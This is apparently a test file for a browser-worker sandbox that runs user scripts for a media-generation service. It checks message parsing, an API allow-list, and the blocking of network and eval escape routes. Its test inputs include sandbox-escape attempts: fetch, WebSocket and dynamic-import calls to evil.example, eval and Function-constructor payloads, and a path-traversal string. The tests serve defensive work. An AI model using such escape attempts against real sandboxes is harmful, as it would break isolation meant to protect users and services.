import { describe, expect, test } from "bun:test";
import {
  parseWorkerMessage,
  isAllowedApiPath,
  summarizeApiBody,
  WORKER_SOURCE,
  ALLOWED_API_PATHS,
  BLOCKED_WORKER_GLOBALS,
} from "./sandbox";
import { TEMPLATES, AURORA_DTS, getTemplate, DEFAULT_TEMPLATE_ID } from "./templates";

describe("parseWorkerMessage", () => {
  test("accepts valid console messages", () => {
    expect(parseWorkerMessage({ type: "console", level: "log", text: "hi" })).toEqual({
      type: "console",
      level: "log",
      text: "hi",
    });
    expect(parseWorkerMessage({ type: "console", level: "error", text: "boom" })?.level).toBe("error");
  });

  test("rejects console messages with bogus levels or missing text", () => {
    expect(parseWorkerMessage({ type: "console", level: "debug", text: "hi" })).toBeNull();
    expect(parseWorkerMessage({ type: "console", level: "log" })).toBeNull();
  });

  test("accepts api messages and preserves body", () => {
    const m = parseWorkerMessage({ type: "api", id: 3, path: "/api/public/generate", body: { kind: "image" } });
    expect(m).toEqual({ type: "api", id: 3, path: "/api/public/generate", body: { kind: "image" } });
  });

  test("rejects api messages without numeric id or string path", () => {
    expect(parseWorkerMessage({ type: "api", id: "3", path: "/x" })).toBeNull();
    expect(parseWorkerMessage({ type: "api", id: 1 })).toBeNull();
  });

  test("progress requires numeric current/total; label optional", () => {
    expect(parseWorkerMessage({ type: "progress", current: 1, total: 5 })).toEqual({
      type: "progress",
      current: 1,
      total: 5,
      label: undefined,
    });
    expect(parseWorkerMessage({ type: "progress", current: "1", total: 5 })).toBeNull();
  });

  test("result requires url", () => {
    expect(parseWorkerMessage({ type: "result", url: "https://x/y.png", kind: "image" })?.url).toBe("https://x/y.png");
    expect(parseWorkerMessage({ type: "result" })).toBeNull();
  });

  test("error falls back to a default message; junk returns null", () => {
    expect(parseWorkerMessage({ type: "error" })).toEqual({ type: "error", message: "Unknown error" });
    expect(parseWorkerMessage(null)).toBeNull();
    expect(parseWorkerMessage("str")).toBeNull();
    expect(parseWorkerMessage({ type: "nope" })).toBeNull();
  });
});

describe("api path allow-list", () => {
  test("only the public generate endpoint is allowed", () => {
    expect(isAllowedApiPath("/api/public/generate")).toBe(true);
    expect(isAllowedApiPath("/api/public/generate/../admin")).toBe(false);
    expect(isAllowedApiPath("/api/mcp")).toBe(false);
    expect(isAllowedApiPath("https://evil.example/api/public/generate")).toBe(false);
    expect(ALLOWED_API_PATHS.length).toBeGreaterThan(0);
  });
});

describe("summarizeApiBody", () => {
  test("summarizes kind, model and truncated prompt", () => {
    const s = summarizeApiBody({ kind: "image", model: "google/nano-banana", prompt: "x".repeat(100) });
    expect(s).toContain("image");
    expect(s).toContain("google/nano-banana");
    expect(s).toContain("…");
  });

  test("handles non-object bodies", () => {
    expect(summarizeApiBody(null)).toBe("");
    expect(summarizeApiBody("hi")).toBe("");
  });
});

describe("WORKER_SOURCE", () => {
  test("never embeds auth material", () => {
    expect(WORKER_SOURCE).not.toContain("Bearer");
    expect(WORKER_SOURCE).not.toContain("Authorization");
    expect(WORKER_SOURCE).not.toContain("access_token");
    expect(WORKER_SOURCE).not.toContain("aurk_");
    expect(WORKER_SOURCE).not.toContain("fetch(");
  });

  test("exposes the aurora client surface", () => {
    for (const member of ["generate", "image:", "video:", "lipsync:", "text:", "progress:", "show:", "sleep:"]) {
      expect(WORKER_SOURCE).toContain(member);
    }
  });

  test("shadows every direct-network global before user code can run", () => {
    for (const name of BLOCKED_WORKER_GLOBALS) {
      expect(WORKER_SOURCE).toContain(`"${name}"`);
    }
    // The lockdown must run before the message handler that executes user code.
    const lockdownIdx = WORKER_SOURCE.indexOf("__BLOCKED");
    const runIdx = WORKER_SOURCE.indexOf('msg.type === "run"');
    expect(lockdownIdx).toBeGreaterThan(-1);
    expect(runIdx).toBeGreaterThan(lockdownIdx);
    expect(WORKER_SOURCE).toContain("sendBeacon");
  });
});

// ─── Functional sandbox boot ─────────────────────────────────────────────────
// Evaluate WORKER_SOURCE against a mock `self` to exercise the real runtime
// behavior: egress lockdown, console capture, and the aurora.* proxy protocol.
// (Bare identifiers like `fetch` resolve via `self` inside a real worker; here
// user code must reference `self.fetch` explicitly to hit the same shadowing.)
function bootMockWorker() {
  const posted: unknown[] = [];
  // Give the mock global a prototype carrying network APIs, mirroring how a
  // real worker exposes fetch & co. on WorkerGlobalScope.prototype — so the
  // prototype-chain lockdown is exercised for real.
  const mockProto: Record<string, unknown> = {
    fetch: () => {
      throw new Error("real fetch reached — lockdown failed");
    },
    WebSocket: function () {
      throw new Error("real WebSocket reached — lockdown failed");
    },
  };
  const mockSelf: Record<string, unknown> = Object.create(mockProto) as Record<string, unknown>;
  mockSelf.postMessage = (m: unknown) => posted.push(m);
  const mockConsole: Record<string, unknown> = {};
  // eslint-disable-next-line @typescript-eslint/no-implied-eval
  const boot = new Function("self", "console", WORKER_SOURCE);
  boot(mockSelf, mockConsole);
  const onmessage = mockSelf.onmessage as (ev: { data: unknown }) => Promise<void>;
  return { posted, onmessage, self: mockSelf };
}

describe("sandbox worker runtime (mocked self)", () => {
  test("blocked globals throw when accessed by user code", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({ data: { type: "run", code: 'self.fetch("https://evil.example");' } });
    const err = posted.find((m) => (m as { type?: string }).type === "error") as
      | { message: string }
      | undefined;
    expect(err).toBeDefined();
    expect(err!.message).toContain("Blocked");
    expect(err!.message).toContain("fetch");
  });

  test("blocked globals cannot be reassigned back", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({
      data: {
        type: "run",
        code: 'self.WebSocket = function(){}; new self.WebSocket("wss://evil.example");',
      },
    });
    const err = posted.find((m) => (m as { type?: string }).type === "error") as
      | { message: string }
      | undefined;
    expect(err).toBeDefined();
    expect(err!.message).toContain("Blocked");
  });

  test("prototype-chain access to blocked globals is dead too", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({
      data: {
        type: "run",
        code: 'console.log(typeof Object.getPrototypeOf(self).fetch, typeof Object.getPrototypeOf(self).WebSocket);',
      },
    });
    expect(posted).toContainEqual({ type: "console", level: "log", text: "undefined undefined" });
    expect(posted).toContainEqual({ type: "done" });
  });

  test("dynamic import is rejected before execution", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({
      data: { type: "run", code: 'await import("https://evil.example/x.js");' },
    });
    const err = posted.find((m) => (m as { type?: string }).type === "error") as
      | { message: string }
      | undefined;
    expect(err).toBeDefined();
    expect(err!.message).toContain("Blocked");
    expect(err!.message).toContain("import");
    // Nothing else ran.
    expect(posted.filter((m) => (m as { type?: string }).type === "done")).toHaveLength(0);
  });

  test("starter templates never trip the import scan", async () => {
    for (const t of TEMPLATES) {
      expect(/\bimport\b/.test(t.code)).toBe(false);
    }
  });

  test("eval and the Function constructor are blocked on the sandbox global", async () => {
    for (const code of ['self.eval("1+1");', 'new self.Function("return 1")();']) {
      const { posted, onmessage } = bootMockWorker();
      await onmessage({ data: { type: "run", code } });
      const err = posted.find((m) => (m as { type?: string }).type === "error") as
        | { message: string }
        | undefined;
      expect(err).toBeDefined();
      expect(err!.message).toContain("Blocked");
    }
  });

  test("string-code timers are rejected; function timers still work", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({
      data: { type: "run", code: 'self.setTimeout("evil()", 1);' },
    });
    const err = posted.find((m) => (m as { type?: string }).type === "error") as
      | { message: string }
      | undefined;
    expect(err).toBeDefined();
    expect(err!.message).toContain("Blocked");

    const second = bootMockWorker();
    await second.onmessage({
      data: { type: "run", code: "await aurora.sleep(1); console.log('woke');" },
    });
    expect(second.posted).toContainEqual({ type: "console", level: "log", text: "woke" });
    expect(second.posted).toContainEqual({ type: "done" });
  });

  test("worker source blocks the constructor escape hatch in real worker realms", () => {
    // The intrinsic .constructor patch is realm-guarded (a mock boot shares
    // the test realm), so assert its presence and coverage statically.
    expect(WORKER_SOURCE).toContain("__blockCtor");
    expect(WORKER_SOURCE).toContain("WorkerGlobalScope");
    expect(WORKER_SOURCE).toContain("async function () {}");
    expect(WORKER_SOURCE).toContain("function* () {}");
    expect(WORKER_SOURCE).toContain("async function* () {}");
    // User scripts are compiled with the captured constructor, not the global.
    expect(WORKER_SOURCE).toContain("new __RealFunction(");
  });

  test("console output is captured and forwarded", async () => {
    const { posted, onmessage } = bootMockWorker();
    await onmessage({ data: { type: "run", code: 'console.log("hello", 42);' } });
    expect(posted).toContainEqual({ type: "console", level: "log", text: "hello 42" });
    expect(posted).toContainEqual({ type: "done" });
  });

  test("aurora.image posts an allow-listed api message and resolves via api-result", async () => {
    const { posted, onmessage } = bootMockWorker();
    const runPromise = onmessage({
      data: { type: "run", code: 'const r = await aurora.image("a cat"); console.log(r.url);' },
    });
    // Wait a tick for the api message to be posted.
    await new Promise((r) => setTimeout(r, 10));
    const api = posted.find((m) => (m as { type?: string }).type === "api") as
      | { id: number; path: string; body: { kind: string; prompt: string } }
      | undefined;
    expect(api).toBeDefined();
    expect(api!.path).toBe("/api/public/generate");
    expect(isAllowedApiPath(api!.path)).toBe(true);
    expect(api!.body).toEqual({ kind: "image", prompt: "a cat" });
    await onmessage({
      data: { type: "api-result", id: api!.id, ok: true, data: { url: "https://cdn/x.png" } },
    });
    await runPromise;
    expect(posted).toContainEqual({ type: "console", level: "log", text: "https://cdn/x.png" });
    expect(posted).toContainEqual({ type: "done" });
  });

  test("rejected api-result surfaces as a script error", async () => {
    const { posted, onmessage } = bootMockWorker();
    const runPromise = onmessage({
      data: { type: "run", code: 'await aurora.generate({ kind: "video" });' },
    });
    await new Promise((r) => setTimeout(r, 10));
    const api = posted.find((m) => (m as { type?: string }).type === "api") as { id: number } | undefined;
    expect(api).toBeDefined();
    await onmessage({
      data: { type: "api-result", id: api!.id, ok: false, error: "Blocked: /api/mcp is not an allowed sandbox API" },
    });
    await runPromise;
    const err = posted.find((m) => (m as { type?: string }).type === "error") as
      | { message: string }
      | undefined;
    expect(err).toBeDefined();
    expect(err!.message).toContain("Blocked");
  });
});

describe("templates", () => {
  test("all templates have unique ids and non-empty code", () => {
    const ids = new Set(TEMPLATES.map((t) => t.id));
    expect(ids.size).toBe(TEMPLATES.length);
    for (const t of TEMPLATES) {
      expect(t.code.trim().length).toBeGreaterThan(0);
      expect(t.label.length).toBeGreaterThan(0);
    }
  });

  test("default template resolves; unknown id falls back to first", () => {
    expect(getTemplate(DEFAULT_TEMPLATE_ID).id).toBe(DEFAULT_TEMPLATE_ID);
    expect(getTemplate("does-not-exist").id).toBe(TEMPLATES[0].id);
  });

  test("ambient types cover the client surface used in templates", () => {
    for (const member of ["generate(", "image(", "video(", "lipsync(", "text(", "progress(", "show(", "sleep("]) {
      expect(AURORA_DTS).toContain(member);
    }
  });
});
